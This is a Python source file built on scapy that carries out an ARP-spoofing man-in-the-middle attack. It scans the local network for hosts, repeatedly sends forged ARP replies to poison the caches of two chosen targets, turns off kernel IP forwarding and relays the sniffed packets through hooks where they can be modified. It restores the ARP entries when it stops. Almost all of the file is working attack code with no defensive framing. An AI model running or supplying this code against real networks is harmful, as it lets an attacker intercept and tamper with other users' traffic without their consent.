from scapy.all import *
import os, netifaces, time, subprocess, psutil, atexit



class LAN_Information:
    def __init__(self, interface: str='', default_gateway: str='', netmask: str='', localhost: str='', subnet: dict={}, mtu: int=0):
        assert LAN_Information.check_permission(), "Run this program with sudo"

        self.interface = interface or conf.route.route('0.0.0.0')[0]
        self.default_gateway = default_gateway or conf.route.route('0.0.0.0')[2]
        self.netmask = netmask or netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['netmask']
        self.localhost = localhost or conf.route.route('0.0.0.0')[1]
        self.subnet = subnet or self.ARP_scan()
        self.mtu = mtu or psutil.net_if_stats()[self.interface].mtu


    def __str__(self):
        return str({
            'interface': self.interface, 
            'default_gateway': self.default_gateway, 
            'netmask': self.netmask, 
            'localhost': self.localhost, 
            'subnet': self.subnet, 
            'mtu': self.mtu
        })


    def copy(self):
        return LAN_Information(self.interface, self.default_gateway, self.netmask, self.localhost, self.subnet.copy(), self.mtu)


    @staticmethod
    def ip2int(ip: str):
        return sum(int(num) << (i * 8) for i, num in enumerate(reversed(ip.split('.'))))


    @staticmethod
    def int2ip(num: int):
        return '.'.join(reversed([str((num >> (i * 8)) & 0xff) for i in range(4)]))


    @staticmethod
    def check_permission():
        return 'SUDO_UID' in os.environ.keys()


    def ARP_scan(self):
        subnet = {self.localhost: get_if_hwaddr(self.interface)}

        ip_range = LAN_Information.int2ip(
            LAN_Information.ip2int(self.localhost) & LAN_Information.ip2int(self.netmask)
        ) + '/' + str(bin(LAN_Information.ip2int(self.netmask)).count('1'))

        pkg = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(
            op = 1, 
            hwsrc = subnet[self.localhost], 
            psrc  = self.localhost, 
            pdst  = ip_range
        )

        res, _ = srp(pkg, timeout=0.3, verbose=False)
        for _, a in res:
            subnet[a[ARP].psrc] = a[ARP].hwsrc
        return subnet



class ARP_Spoofing(threading.Thread):
    def __init__(self, LAN_info: LAN_Information, target0_ip: str, target1_ip: str):
        threading.Thread.__init__(self)
        self.daemon = True

        self.LAN_info = LAN_info.copy()
        self.target0_ip = target0_ip
        self.target1_ip = target1_ip
        self.stopflag = False


    def run(self):
        pkg0 = Ether(dst=self.LAN_info.subnet[self.target0_ip]) / ARP(
            op = 2, 
            hwsrc = self.LAN_info.subnet[self.LAN_info.localhost], 
            psrc  = self.target1_ip, 
            hwdst = self.LAN_info.subnet[self.target0_ip], 
            pdst  = self.target0_ip
        )
        pkg1 = Ether(dst=self.LAN_info.subnet[self.target1_ip]) / ARP(
            op = 2, 
            hwsrc = self.LAN_info.subnet[self.LAN_info.localhost], 
            psrc  = self.target0_ip, 
            hwdst = self.LAN_info.subnet[self.target1_ip], 
            pdst  = self.target1_ip
        )

        while not self.stopflag: 
            sendp(pkg0, verbose=False)
            sendp(pkg1, verbose=False)
            time.sleep(1)


    def stop(self):
        self.stopflag = True
        self.join()

        pkg0 = Ether(dst=self.LAN_info.subnet[self.target0_ip]) / ARP(
            op = 2, 
            hwsrc = self.LAN_info.subnet[self.target1_ip], 
            psrc  = self.target1_ip, 
            hwdst = self.LAN_info.subnet[self.target0_ip], 
            pdst  = self.target0_ip
        )
        pkg1 = Ether(dst=self.LAN_info.subnet[self.target1_ip]) / ARP(
            op = 2, 
            hwsrc = self.LAN_info.subnet[self.target0_ip], 
            psrc  = self.target0_ip, 
            hwdst = self.LAN_info.subnet[self.target1_ip], 
            pdst  = self.target1_ip
        )

        sendp(pkg0, verbose=False)
        sendp(pkg1, verbose=False)




class ARP_Spoofing_MITM:
    def __init__(self, target0_ip: str, target1_ip: str):
        ARP_Spoofing_MITM.disable_ip_forwarding()

        self.LAN_info = LAN_Information()
        self.target0_ip = target0_ip
        self.target1_ip = target1_ip

        self.ARP_spoofing = ARP_Spoofing(self.LAN_info, target0_ip, target1_ip)

        self.stop_sniff = False


    def start(self):
        self.sniff_thread = threading.Thread(target=self.sniff_daemon, daemon=True)

        self.ARP_spoofing.start()
        self.sniff_thread.start()

        atexit.register(self.stop)


    def stop(self):
        self.stop_sniff = True

        self.sniff_thread.join()
        self.ARP_spoofing.stop()


    def sniff_daemon(self):
        sniff(store=0, prn=self.pkg_filter, stop_filter=self.stop_sniff_filter, iface=self.LAN_info.interface)


    def pkg_filter(self, pkg):
        if not IP in pkg:
            return

        if (pkg[Ether].src == self.LAN_info.subnet[self.target0_ip]):
            if (pkg[IP].dst == self.target1_ip) or ((not self.in_subnet(pkg[IP].dst)) and (self.target1_ip == self.LAN_info.default_gateway)):
                for tamper_pkg in self.mitm2target1(pkg[IP]):
                    self._mitm2target1(tamper_pkg)
                return
            else:
                return

        elif (pkg[Ether].src == self.LAN_info.subnet[self.target1_ip]):
            if (pkg[IP].dst == self.target0_ip) or ((not self.in_subnet(pkg[IP].dst)) and (self.target0_ip == self.LAN_info.default_gateway)):
                for tamper_pkg in self.mitm2target0(pkg[IP]):
                    self._mitm2target0(tamper_pkg)
                return
            else:
                return

        else:
            return


    def _mitm2target1(self, pkg):
        pkg_list = [
            Ether(dst=self.LAN_info.subnet[self.target1_ip]) / frag_pkg[IP] 
            for frag_pkg in pkg.fragment(fragsize=self.LAN_info.mtu - 20)
        ]
        sendp(PacketList(pkg_list), verbose=False)


    def _mitm2target0(self, pkg):
        pkg_list = [
            Ether(dst=self.LAN_info.subnet[self.target0_ip]) / frag_pkg[IP]
            for frag_pkg in pkg.fragment(fragsize=self.LAN_info.mtu - 20)
        ]
        sendp(PacketList(pkg_list), verbose=False)


    def stop_sniff_filter(self, pkg):
        return self.stop_sniff


    def mitm2target1(self, pkg):
        return [pkg]


    def mitm2target0(self, pkg):
        return [pkg]


    def in_subnet(self, ip: str):
        mask = LAN_Information.ip2int(self.LAN_info.netmask)
        return (LAN_Information.ip2int(ip) & mask) == (LAN_Information.ip2int(self.LAN_info.default_gateway) & mask)


    @staticmethod
    def disable_ip_forwarding():
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['sysctl', '-p', '/etc/sysctl.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

